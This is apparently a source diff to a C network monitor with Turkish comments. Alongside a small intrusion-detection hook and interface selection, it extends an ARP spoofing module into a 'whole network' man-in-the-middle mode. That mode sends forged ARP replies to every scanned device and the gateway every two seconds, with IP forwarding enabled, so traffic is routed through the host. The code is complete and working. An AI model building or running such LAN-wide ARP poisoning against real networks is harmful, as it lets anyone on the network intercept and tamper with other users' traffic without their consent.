@@ -5,6 +5,8 @@
  */
 
 #include "network_monitor.h"
+#include "arp_scanner.h"
+#include "network_ids.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -1080,6 +1082,12 @@ static void handle_packet(const struct pcap_pkthdr *header, const u_char *packet
     dissect_ethernet(&pkt, packet, header->caplen);
 #endif
 
+    /* IDS besleme: ham veri yalnizca Ethernet datalink'te guvenilir */
+#ifdef PLATFORM_LINUX
+    if (g_datalink_type == DLT_EN10MB)
+        ids_process_packet(&pkt);
+#endif
+
     /* Eğer protokol hâlâ boşsa varsayılan ata */
     if (pkt.protocol[0] == '\0') {
         strncpy(pkt.protocol, "ETH", sizeof(pkt.protocol) - 1);
@@ -1241,6 +1249,38 @@ static int parse_proc_net_line(const char *line, const char *proto, PacketRecord
               pkt->src_ip, local_port, pkt->dst_ip, remote_port,
               pkt->protocol, is_tcp ? pkt->flags : "");
 
+    /* /proc/net modunda IDS icin sentetik ham cerceve uret
+       (SYN_SENT: biz -> uzak, SYN_RECV: uzak -> biz saldirgan) */
+    if (is_tcp && (state == 2 || state == 3)) {
+        unsigned char *r = pkt->raw_data;
+        memset(r, 0, MAX_RAW_SIZE);
+        r[12] = 0x08; r[13] = 0x00;              /* EtherType IPv4 */
+        r[14] = 0x45;                            /* IPv4, IHL=5 */
+        r[23] = 6;                               /* TCP */
+        unsigned int a[4] = {0}, b[4] = {0};
+        sscanf(pkt->src_ip, "%u.%u.%u.%u", &a[0], &a[1], &a[2], &a[3]);
+        sscanf(pkt->dst_ip, "%u.%u.%u.%u", &b[0], &b[1], &b[2], &b[3]);
+        unsigned char src_b[4] = {(unsigned char)a[0], (unsigned char)a[1],
+                                  (unsigned char)a[2], (unsigned char)a[3]};
+        unsigned char dst_b[4] = {(unsigned char)b[0], (unsigned char)b[1],
+                                  (unsigned char)b[2], (unsigned char)b[3]};
+        if (state == 3) { /* SYN_RECV: uzak taraf SYN gonderiyor */
+            memcpy(r + 26, dst_b, 4); memcpy(r + 30, src_b, 4);
+            r[34] = (unsigned char)(remote_port >> 8);
+            r[35] = (unsigned char)(remote_port & 0xFF);
+            r[36] = (unsigned char)(local_port >> 8);
+            r[37] = (unsigned char)(local_port & 0xFF);
+        } else {         /* SYN_SENT: biz SYN gonderiyoruz */
+            memcpy(r + 26, src_b, 4); memcpy(r + 30, dst_b, 4);
+            r[34] = (unsigned char)(local_port >> 8);
+            r[35] = (unsigned char)(local_port & 0xFF);
+            r[36] = (unsigned char)(remote_port >> 8);
+            r[37] = (unsigned char)(remote_port & 0xFF);
+        }
+        r[46] = 0x50; r[47] = 0x02;              /* TCP hdr uzunlugu 5, SYN */
+        pkt->raw_len = 54;
+    }
+
     return 1;
 }
 
@@ -1257,6 +1297,8 @@ static int poll_proc_net_file(const char *path, const char *proto) {
         PacketRecord pkt;
         if (parse_proc_net_line(line, proto, &pkt)) {
             pkt.packet_number = total_captured + 1;
+
+            ids_process_packet(&pkt);
 
             platform_mutex_lock(&global_lock);
             packet_buffer[write_idx] = pkt;
@@ -1320,8 +1362,37 @@ static void *monitor_thread(void *arg) {
     pcap_t *handle = NULL;
 
     if (!iface || !iface[0]) {
+        /* Phase 0: Default route'un oldugu arayuzu oncelikle dene.
+         * Trafik ve ARP spoof oradan aktigi icin dogru NIC budur;
+         * "wlan once" secimi, wlan0 sessizken hic paket gostermez. */
+        FILE *rf = fopen("/proc/net/route", "r");
+        if (rf) {
+            char line[256];
+            char best_if[16] = "";
+            unsigned long best_metric = 0xFFFFFFFFUL;
+            fgets(line, sizeof(line), rf); /* header */
+            while (fgets(line, sizeof(line), rf)) {
+                char name[16];
+                unsigned int dest = 0, flags = 0;
+                unsigned long metric = 0;
+                if (sscanf(line, "%15s %x %*s %x %*d %*d %lu",
+                           name, &dest, &flags, &metric) == 4) {
+                    if (dest == 0 && (flags & 0x0001) && metric < best_metric) {
+                        best_metric = metric;
+                        strncpy(best_if, name, sizeof(best_if) - 1);
+                    }
+                }
+            }
+            fclose(rf);
+            if (best_if[0]) {
+                handle = try_open_ethernet(best_if, errbuf);
+                if (handle)
+                    fprintf(stderr, "[FULL_MONITOR] Default-route iface: %s\n", best_if);
+            }
+        }
+
         pcap_if_t *devs;
-        if (pcap_findalldevs(&devs, errbuf) >= 0 && devs) {
+        if (!handle && pcap_findalldevs(&devs, errbuf) >= 0 && devs) {
             /*
              * Phase 1: Prefer known real network interfaces.
              * Order: wlan*, eth*, enp*, ens*, eno*, then "any".
@@ -1491,12 +1562,26 @@ static int g_arp_spoof_running = 0;
 static platform_thread_t g_arp_thread;
 static unsigned char g_gateway_mac[6];
 static unsigned char g_target_mac[6];
+static int     g_target_mac_valid = 0;
 static unsigned char g_my_mac[6];
 static char g_spoof_target_ip[MAX_IP_LEN] = {0};
 static char g_spoof_gateway_ip[MAX_IP_LEN] = {0};
 static char g_spoof_iface[MAX_IFACE_LEN] = {0};
 static volatile int g_arp_raw_fd = -1;
 static int g_ip_forward_original = -1;
+
+/* ---- Coklu hedef spoof (tum ag MITM) ---- */
+#define MAX_SPOOF_TARGETS 256
+typedef struct {
+    char ip[MAX_IP_LEN];
+    unsigned char mac[6];
+    int  mac_valid;
+} SpoofTarget;
+
+static SpoofTarget g_spoof_targets[MAX_SPOOF_TARGETS];
+static int  g_spoof_target_count = 0;
+static platform_mutex_t g_spoof_lock;
+static int  g_spoof_lock_init = 0;
 
 /* --- Yardımcı: Kendi MAC adresimizi al --- */
 static int spoof_get_own_mac(const char *iface, unsigned char *mac) {
@@ -1648,6 +1733,16 @@ static void send_arp_reply(int raw_fd, const char *iface,
     sendto(raw_fd, buf, 42, 0, (struct sockaddr *)&addr, sizeof(addr));
 }
 
+/* MAC string ("aa:bb:cc:dd:ee:ff") -> 6 byte */
+static int spoof_parse_mac(const char *s, unsigned char mac[6]) {
+    unsigned int b[6];
+    if (!s || sscanf(s, "%x:%x:%x:%x:%x:%x",
+                     &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
+        return -1;
+    for (int i = 0; i < 6; i++) mac[i] = (unsigned char)b[i];
+    return 0;
+}
+
 /* --- ARP Spoof döngüsü (ayrı thread) --- */
 static void *arp_spoof_loop(void *arg) {
     (void)arg;
@@ -1673,35 +1768,56 @@ static void *arp_spoof_loop(void *arg) {
             g_gateway_mac[0], g_gateway_mac[1], g_gateway_mac[2],
             g_gateway_mac[3], g_gateway_mac[4], g_gateway_mac[5]);
 
-    /* Hedef cihaz MAC'ini çöz */
-    fprintf(stderr, "[ARP_SPOOF] Hedef MAC cozuluyor: %s\n", g_spoof_target_ip);
-    if (arp_resolve_mac(g_spoof_target_ip, g_target_mac, g_spoof_iface) < 0) {
-        fprintf(stderr, "[ARP_SPOOF] Hedef MAC bulunamadi: %s\n", g_spoof_target_ip);
-        close(raw_fd);
-        g_arp_raw_fd = -1;
-        g_arp_spoof_running = 0;
-        return NULL;
+    /* Tek hedefli moddaysa hedef MAC'i onceden coz */
+    int single_mode = (g_spoof_target_ip[0] != '\0');
+    g_target_mac_valid = 0;
+    if (single_mode) {
+        fprintf(stderr, "[ARP_SPOOF] Hedef MAC cozuluyor: %s\n", g_spoof_target_ip);
+        if (arp_resolve_mac(g_spoof_target_ip, g_target_mac, g_spoof_iface) == 0) {
+            g_target_mac_valid = 1;
+            fprintf(stderr, "[ARP_SPOOF] Hedef MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                    g_target_mac[0], g_target_mac[1], g_target_mac[2],
+                    g_target_mac[3], g_target_mac[4], g_target_mac[5]);
+        } else {
+            fprintf(stderr, "[ARP_SPOOF] Uyari: hedef MAC cozulemedi: %s\n", g_spoof_target_ip);
+        }
     }
-    fprintf(stderr, "[ARP_SPOOF] Hedef MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-            g_target_mac[0], g_target_mac[1], g_target_mac[2],
-            g_target_mac[3], g_target_mac[4], g_target_mac[5]);
 
     /* Kendi MAC'imizi al */
     spoof_get_own_mac(g_spoof_iface, g_my_mac);
 
-    fprintf(stderr, "[ARP_SPOOF] Baslatildi: %s <-> %s (iface: %s)\n",
-            g_spoof_target_ip, g_spoof_gateway_ip, g_spoof_iface);
+    fprintf(stderr, "[ARP_SPOOF] Baslatildi: %s <-> %s (iface: %s)%s\n",
+            single_mode ? g_spoof_target_ip : "<TUM AG>",
+            g_spoof_gateway_ip, g_spoof_iface,
+            single_mode ? "" : " [coklu hedef modu]");
 
     while (g_arp_spoof_running) {
-        /* Hedefe söyle: "Gateway benim" */
-        send_arp_reply(raw_fd, g_spoof_iface,
-                       g_my_mac, g_spoof_gateway_ip,      /* src: bizim MAC, gateway IP */
-                       g_target_mac, g_spoof_target_ip);   /* dst: hedef MAC, hedef IP */
-
-        /* Gateway'e söyle: "Hedef benim" */
-        send_arp_reply(raw_fd, g_spoof_iface,
-                       g_my_mac, g_spoof_target_ip,        /* src: bizim MAC, hedef IP */
-                       g_gateway_mac, g_spoof_gateway_ip); /* dst: gateway MAC, gateway IP */
+        platform_mutex_lock(&g_spoof_lock);
+        if (single_mode) {
+            if (g_target_mac_valid) {
+                /* Hedefe söyle: "Gateway benim" */
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_my_mac, g_spoof_gateway_ip,
+                               g_target_mac, g_spoof_target_ip);
+                /* Gateway'e söyle: "Hedef benim" */
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_my_mac, g_spoof_target_ip,
+                               g_gateway_mac, g_spoof_gateway_ip);
+            }
+        } else {
+            /* Tum hedefleri zehirle: her cihaz icin 2 ARP Reply */
+            for (int i = 0; i < g_spoof_target_count; i++) {
+                SpoofTarget *t = &g_spoof_targets[i];
+                if (!t->mac_valid) continue;
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_my_mac, g_spoof_gateway_ip,
+                               t->mac, t->ip);
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_my_mac, t->ip,
+                               g_gateway_mac, g_spoof_gateway_ip);
+            }
+        }
+        platform_mutex_unlock(&g_spoof_lock);
 
         /* 2 saniyede bir tekrarla (ARP cache yenileme) */
         for (int i = 0; i < 20 && g_arp_spoof_running; i++)
@@ -1709,28 +1825,38 @@ static void *arp_spoof_loop(void *arg) {
     }
 
     /* ===== TEMİZLİK: Gerçek ARP bilgilerini geri yükle ===== */
-    fprintf(stderr, "[ARP_SPOOF] ARP cache geri yukleniyor...\n");
+    fprintf(stderr, "[ARP_SPOOF] ARP cache geri yukleniyor (%d hedef)...\n",
+            single_mode ? 1 : g_spoof_target_count);
 
-    /* Hedefe gerçek gateway MAC'ini gönder */
-    send_arp_reply(raw_fd, g_spoof_iface,
-                   g_gateway_mac, g_spoof_gateway_ip,
-                   g_target_mac, g_spoof_target_ip);
-
-    /* Gateway'e gerçek hedef MAC'ini gönder */
-    send_arp_reply(raw_fd, g_spoof_iface,
-                   g_target_mac, g_spoof_target_ip,
-                   g_gateway_mac, g_spoof_gateway_ip);
-
-    /* Birkaç kere daha gönder (güvenilirlik) */
-    for (int r = 0; r < 3; r++) {
-        platform_sleep_ms(200);
-        send_arp_reply(raw_fd, g_spoof_iface,
-                       g_gateway_mac, g_spoof_gateway_ip,
-                       g_target_mac, g_spoof_target_ip);
-        send_arp_reply(raw_fd, g_spoof_iface,
-                       g_target_mac, g_spoof_target_ip,
-                       g_gateway_mac, g_spoof_gateway_ip);
+    platform_mutex_lock(&g_spoof_lock);
+    if (single_mode) {
+        if (g_target_mac_valid) {
+            for (int r = 0; r < 4; r++) {
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_gateway_mac, g_spoof_gateway_ip,
+                               g_target_mac, g_spoof_target_ip);
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_target_mac, g_spoof_target_ip,
+                               g_gateway_mac, g_spoof_gateway_ip);
+                if (r < 3) platform_sleep_ms(200);
+            }
+        }
+    } else {
+        for (int i = 0; i < g_spoof_target_count; i++) {
+            SpoofTarget *t = &g_spoof_targets[i];
+            if (!t->mac_valid) continue;
+            for (int r = 0; r < 2; r++) {
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               g_gateway_mac, g_spoof_gateway_ip,
+                               t->mac, t->ip);
+                send_arp_reply(raw_fd, g_spoof_iface,
+                               t->mac, t->ip,
+                               g_gateway_mac, g_spoof_gateway_ip);
+            }
+            platform_sleep_ms(50);
+        }
     }
+    platform_mutex_unlock(&g_spoof_lock);
 
     close(raw_fd);
     g_arp_raw_fd = -1;
@@ -1770,13 +1896,23 @@ void disable_ip_forward(void) {
 }
 
 /* --- Public API --- */
+static void spoof_lock_ensure_init(void) {
+    if (!g_spoof_lock_init) {
+        platform_mutex_init(&g_spoof_lock);
+        g_spoof_lock_init = 1;
+    }
+}
+
 void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *iface) {
     if (g_arp_spoof_running) return;
     if (!target_ip || !gateway_ip || !iface) return;
 
+    spoof_lock_ensure_init();
+
     strncpy(g_spoof_target_ip, target_ip, sizeof(g_spoof_target_ip) - 1);
     strncpy(g_spoof_gateway_ip, gateway_ip, sizeof(g_spoof_gateway_ip) - 1);
     strncpy(g_spoof_iface, iface, sizeof(g_spoof_iface) - 1);
+    g_spoof_target_count = 0;   /* coklu hedef modunu kapat */
 
     /* IP forwarding aç (yoksa MITM paketleri düşer) */
     enable_ip_forward();
@@ -1784,6 +1920,54 @@ void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *
     g_arp_spoof_running = 1;
     platform_thread_create(&g_arp_thread, arp_spoof_loop, NULL);
     platform_thread_detach(g_arp_thread);
+}
+
+/* Tum agi dinleme: hedef listesi arp_spoof_sync_targets ile beslenir */
+void arp_spoof_start_all(const char *gateway_ip, const char *iface) {
+    if (g_arp_spoof_running) return;
+    if (!gateway_ip || !iface) return;
+
+    spoof_lock_ensure_init();
+
+    strncpy(g_spoof_gateway_ip, gateway_ip, sizeof(g_spoof_gateway_ip) - 1);
+    strncpy(g_spoof_iface, iface, sizeof(g_spoof_iface) - 1);
+    g_spoof_target_ip[0] = '\0';   /* coklu hedef modu */
+    g_spoof_target_count = 0;
+
+    enable_ip_forward();
+
+    g_arp_spoof_running = 1;
+    platform_thread_create(&g_arp_thread, arp_spoof_loop, NULL);
+    platform_thread_detach(g_arp_thread);
+    fprintf(stderr, "[ARP_SPOOF] Tum ag izleme modu baslatildi (iface=%s)\n", iface);
+}
+
+/* Tarayici sonuclarindan hedef listesini guncelle (GUI her ~2 sn cagirir) */
+void arp_spoof_sync_targets(const Device *devices, int count,
+                            const char *gateway_ip, const char *local_ip) {
+    if (!devices || count <= 0) return;
+
+    platform_mutex_lock(&g_spoof_lock);
+    g_spoof_target_count = 0;
+    for (int i = 0; i < count && g_spoof_target_count < MAX_SPOOF_TARGETS; i++) {
+        const Device *d = &devices[i];
+        if (!d->ip[0] || !d->mac[0]) continue;
+        if (gateway_ip && strcmp(d->ip, gateway_ip) == 0) continue;
+        if (local_ip && strcmp(d->ip, local_ip) == 0) continue;
+        SpoofTarget *t = &g_spoof_targets[g_spoof_target_count];
+        strncpy(t->ip, d->ip, sizeof(t->ip) - 1);
+        if (spoof_parse_mac(d->mac, t->mac) == 0) {
+            t->mac_valid = 1;
+            g_spoof_target_count++;
+        } else {
+            t->mac_valid = 0;
+        }
+    }
+    platform_mutex_unlock(&g_spoof_lock);
+}
+
+int arp_spoof_get_target_count(void) {
+    return g_spoof_target_count;
 }
 
 void arp_spoof_stop(void) {
@@ -1797,6 +1981,7 @@ void arp_spoof_stop(void) {
     disable_ip_forward();
 
     g_spoof_target_ip[0] = '\0';
+    g_spoof_target_count = 0;
     fprintf(stderr, "[ARP_SPOOF] Tamamen durduruldu.\n");
 }
 
@@ -1819,5 +2004,14 @@ void arp_spoof_start(const char *target_ip, const char *gateway_ip, const char *
 void arp_spoof_stop(void) {}
 int  arp_spoof_is_running(void) { return 0; }
 const char *arp_spoof_get_target(void) { return ""; }
+void arp_spoof_start_all(const char *gateway_ip, const char *iface) {
+    (void)gateway_ip; (void)iface;
+    fprintf(stderr, "[ARP_SPOOF] Windows'da desteklenmiyor.\n");
+}
+void arp_spoof_sync_targets(const Device *devices, int count,
+                            const char *gateway_ip, const char *local_ip) {
+    (void)devices; (void)count; (void)gateway_ip; (void)local_ip;
+}
+int  arp_spoof_get_target_count(void) { return 0; }
 
 #endif /* PLATFORM_LINUX */
